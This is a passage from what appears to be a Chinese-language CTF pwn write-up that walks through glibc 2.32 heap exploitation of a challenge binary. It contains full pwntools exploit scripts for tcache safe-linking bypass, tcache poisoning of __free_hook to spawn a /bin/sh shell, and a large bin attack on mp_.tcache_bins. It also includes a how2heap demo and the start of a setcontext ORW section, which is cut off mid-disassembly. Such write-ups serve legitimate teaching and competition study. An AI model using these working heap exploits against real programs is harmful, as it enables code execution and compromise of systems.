class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ menu ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-comment">#------------------------ 1.safe_linking + libc  ------------------</span><br><span class="hljs-comment">#Tcache: safe_link</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>add(i, <span class="hljs-number">128</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>free(i)<br><br>show(<span class="hljs-number">0</span>)<br><br>key = u64(p.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><span class="hljs-comment">#Leak_libc</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">96</span>)<br>show(<span class="hljs-number">7</span>)<br><br>main_arena =  u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x80</span><br>malloc_hook = main_arena - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ 2.Gadget  ----------------------------</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;free_hook&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br><span class="hljs-comment">#------------------------ 3.tcache_poinion  --------------------  </span><br>edit(<span class="hljs-number">6</span>, p64(free_hook ^ key))<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">128</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">128</span>)<br>edit(<span class="hljs-number">11</span>, p64(system))<br><br><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">64</span>)<br>edit(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>free(<span class="hljs-number">12</span>)<br><br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="9-large-note"><a href="#9-large-note" class="headerlink" title="9.large_note"></a>9.large_note</h2><h3 id="mp-tcache-bins"><a href="#mp-tcache-bins" class="headerlink" title="mp_.tcache_bins"></a>mp_.tcache_bins</h3><p><strong>libc-2.31.so</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">tcache_get (size_t tc_idx)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">tcache_entry</span> *e = tcache-&gt;</span>entries[tc_idx];<br>  <span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">entries</span>[tc_idx] = e-&gt;</span>next;<br>  --(<span class="hljs-function"><span class="hljs-title">tcache</span>-&gt;</span>counts[tc_idx]);<br>  <span class="hljs-function"><span class="hljs-title">e</span>-&gt;</span>key = NULL;<br>  return (void *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以<strong>利用任意写</strong>一字节来修改最高位为 0xFF，修改 <strong>mp_.tcache_bins</strong> </p><p><strong>定位：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash"> p &amp;mp_.tcache_bins</span><br></code></pre></td></tr></table></figure><h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h3><p><a href="https://xz.aliyun.com/t/5177">https://xz.aliyun.com/t/5177</a></p><p><strong>目的：任意写，修改&amp;mp_.tcache_bins的值</strong></p><p><strong>large bin结构：</strong></p><p><strong>pre_size        |      size</strong></p><p><strong>fd       |   bk</strong></p><p><strong>fd_nextsize  |      bk_nextsize</strong></p><ul><li><p>fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针</p></li><li><p>bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针</p></li><li><p>空闲的large chunk在fd的遍历顺序中，<strong>按照由大到小的顺序排列</strong>。这样可以避免在寻找合适chunk时挨个遍历</p></li></ul><p><strong>常见的两种利用：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">申请largebin的过程中，伪造largebin的bk_nextsize，实现非预期内存申请。<br><br>插入largebin的过程中，伪造largebin的bk_nextsize以及bk，实现任意地址写堆地址。<br></code></pre></td></tr></table></figure><p><strong>重点学习第二种：</strong></p><h4 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a><strong>how2heap</strong></h4><p><strong>libc2.32</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">A revisit to large bin attack for after glibc2.30</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Relevant code snippet :</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="hljs-comment">fwd = bck;</span><br><span class="hljs-comment">bck = bck-&gt;bk;</span><br><span class="hljs-comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="hljs-comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="hljs-comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>  <span class="hljs-comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span><br>  setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-literal">NULL</span>,_IONBF,<span class="hljs-number">0</span>);<br><br>  <span class="hljs-type">size_t</span> target = <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-type">size_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x428</span>);<br>  <span class="hljs-type">size_t</span> *g1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>  <span class="hljs-type">size_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x418</span>);<br>  <span class="hljs-type">size_t</span> *g2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br><br>  <span class="hljs-built_in">free</span>(p1);<br><br>  <span class="hljs-type">size_t</span> *g3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br>  <span class="hljs-built_in">free</span>(p2);<br>    <br><br>  p1[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)((&amp;target)<span class="hljs-number">-4</span>);<br><br><br>  <span class="hljs-type">size_t</span> *g4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x438</span>);<br><br>  assert((<span class="hljs-type">size_t</span>)(p2<span class="hljs-number">-2</span>) == target);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#前期准备</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">1536</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">1296</span>)<span class="hljs-comment">#分隔两个large_chunk</span><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">1792</span>)<span class="hljs-comment">#UAF</span><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">1296</span>)<span class="hljs-comment">#分隔两个large_chunk</span><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">1792</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">1296</span>)<span class="hljs-comment">#分隔TOP chunk</span><br><br><span class="hljs-comment">#置入large_bin</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#UAF</span><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">1280</span>)<span class="hljs-comment">#将第一个切分，同时第二个进入large bin</span><br><br><span class="hljs-comment">#ATTACK</span><br>free(<span class="hljs-number">4</span>)  <span class="hljs-comment">#置unsorted bin</span><br>edit(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) + p64(target1+<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0</span>) + p64(target2+<span class="hljs-number">0x20</span>))   <span class="hljs-comment">#fake_bk &amp; fake bk_nextsize</span><br>add(<span class="hljs-number">7</span>, <span class="hljs-number">1280</span>)<span class="hljs-comment">#ATTACK</span><br></code></pre></td></tr></table></figure><p><strong>Attack的结果是,target1和2处的值均改为chunk7的头指针</strong></p><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>菜单同上，增删改查</p><p>区别只在add_note</p><p><strong>add_note：次数16，大小为[0x500, 0x900]</strong></p><p><strong>delete_note：UAF</strong></p><p><strong>edit_note：直接修改内容</strong></p><p><strong>show_note：输出</strong></p><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p><strong>因为chunk大小的限制，只能是[0x500, 0x900]</strong></p><p><strong>学习一种打法，适用于libc2.27-libc2.32</strong></p><ol><li><strong>构造unsorted bin，泄露获取libc和heap</strong></li><li><strong>通过large bin attack 打 mp_.tcache_bins 单字节，修改tcache bin大小上限</strong></li><li><strong>再通过tcache poinion的方法打__free_hook^key为system</strong></li></ol><p><strong>KEY：写入的对应堆块的首地址&gt;&gt;12</strong></p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.32.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ MENU  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------ 1.heap &amp; libc  ----------------------</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">1360</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">1360</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">1280</span>)<br><br>show(<span class="hljs-number">2</span>)<br>malloc_hook = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1184</span> - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">b&quot;b&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> ,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span> <br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><br><span class="hljs-comment">#---------------------- 2. large bin attack ----------------- </span><br>mp = libc_base + <span class="hljs-number">0x1E32D0</span> <span class="hljs-comment">#pwndbg&gt; print &amp;mp_.tcache_bins</span><br>lg(<span class="hljs-string">&#x27;mp&#x27;</span>)<br><br><span class="hljs-comment">#largebin</span><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">1568</span>) <span class="hljs-comment">#0x620,UAF -&gt; large bin</span><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">1296</span>) <span class="hljs-comment">#fen</span><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">1552</span>) <span class="hljs-comment">#0x610</span><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">1296</span>) <span class="hljs-comment">#fen,0x510</span><br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">1584</span>) <span class="hljs-comment">#0x630</span><br><br>free(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#keep the heap</span><br><span class="hljs-comment">#fake_bk_nextsize</span><br>fd = libc_base + <span class="hljs-number">0x1E4070</span><br>bk = libc_base + <span class="hljs-number">0x1E4070</span><br>fd_nextsize = heap_base + <span class="hljs-number">0xCB0</span><br>edit(<span class="hljs-number">3</span>, p64(fd)+p64(bk)+p64(fd_nextsize)+p64(mp-<span class="hljs-number">0x20</span>) ) <br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">1584</span>)<span class="hljs-comment">#ATTACK</span><br><br><span class="hljs-comment">#------------------------ 3.tcache poisioning  ----------------------------</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>lg(<span class="hljs-string">&#x27;free_hook&#x27;</span>)<br>lg(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">6</span>)  <span class="hljs-comment">#6 --&gt; 4</span><br>key = (heap_base+<span class="hljs-number">0x1EC0</span>) &gt;&gt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br><br>edit(<span class="hljs-number">6</span>, p64(free_hook ^ key)) <span class="hljs-comment">#4 -&gt; free_hook</span><br><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">1296</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">1296</span>)<br>edit(<span class="hljs-number">10</span>, p64(system))<br><br>edit(<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>free(<span class="hljs-number">9</span>)<br><span class="hljs-comment">#debug()</span><br> <br>pi()<br></code></pre></td></tr></table></figure><h2 id="10-note-context"><a href="#10-note-context" class="headerlink" title="10.note_context"></a>10.note_context</h2><p>在上一题的基础上，绕过沙盒，setcontext栈劫持，通过orw进行pwn</p><h3 id="setcontext-61"><a href="#setcontext-61" class="headerlink" title="setcontext+61"></a>setcontext+61</h3><p><strong>思路：</strong></p><p>存在沙箱，不能system，为了能够获取flag</p><p>需要通过构造ROP链实现ORW</p><p>又因为ROP链需要控栈</p><p>setcontext有段gadget非常有用</p><p>所以需要使用setcontext</p><p><strong>setcontext+61</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pwndbg&gt; x /30i setcontext+61<br>   0x7f0efe05606d &lt;setcontext+61&gt;:mov    rsp,QWORD PTR [rdx+0xa0]<br>   0x7f0efe056074 &lt;setcontext+68&gt;:mov    rbx,QWORD PTR [rdx+0x80]<br>   0x7f0efe05607b &lt;setcontext+75&gt;:mov    rbp,QWORD PTR [rdx+0x78]<br>   0x7f0efe05607f &lt;setcontext+79&gt;:mov    r12,QWORD PTR [rdx+0x48]<br>   0x7f0efe056083 &lt;setcontext+83&gt;:mov    r13,QWORD PTR [rdx+0x50]<br>   0x7f0efe056087 